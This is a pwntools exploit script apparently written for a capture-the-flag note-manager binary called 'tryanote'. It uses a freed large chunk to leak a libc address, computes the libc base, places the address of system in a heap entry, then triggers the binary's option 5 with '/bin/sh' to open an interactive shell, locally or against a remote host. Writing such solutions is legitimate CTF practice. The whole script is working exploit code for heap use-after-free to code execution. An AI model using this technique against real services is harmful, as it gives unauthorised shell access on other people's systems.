#!/usr/bin/env python3

from pwn import *
import os

os.system("clear")
os.system("rm core.*")

elf = context.binary = ELF("tryanote")
libc = ELF("libc.so.6")
context.terminal = ["tmux", "splitw", "-v"]

gs = '''
   continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(*(sys.argv[1].split(":")))
    else:
        return process(elf.path)

r = start()

def create(size, content):
    r.sendlineafter(b'\n>>', b'1')
    r.sendlineafter(b'Enter entry size:\n', str(size).encode())
    r.sendlineafter(b'Enter entry data:\n', content)

def show(index):
    r.sendlineafter(b'\n>>', b'2')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())

def update(index, content):
    r.sendlineafter(b'\n>>', b'3')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())
    r.sendlineafter(b'Enter data:\n', content)

def delete(index):
    r.sendlineafter(b'\n>>', b'4')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())

def win(index, content):
    r.sendlineafter(b'\n>>', b'5')
    r.sendlineafter(b'Enter the index:', str(index).encode())
    r.sendlineafter(b'Enter the data:', content.encode())

# Create two large chunks and free the first one
create(0x1000, b"A")
create(0x1000, b"A")
delete(0)

show(0)

leak = u64(r.recvline().strip().ljust(8, b'\x00'))
print(f'leaked_addr: 0x{leak:02x}')

libc.address = leak - 0x219ce0
print(f'libc_base: 0x{libc.address:02x}')

create(0x200, p64(libc.sym.system))

win(2, str(next(libc.search(b"/bin/sh\x00"))))

r.interactive("$ ")
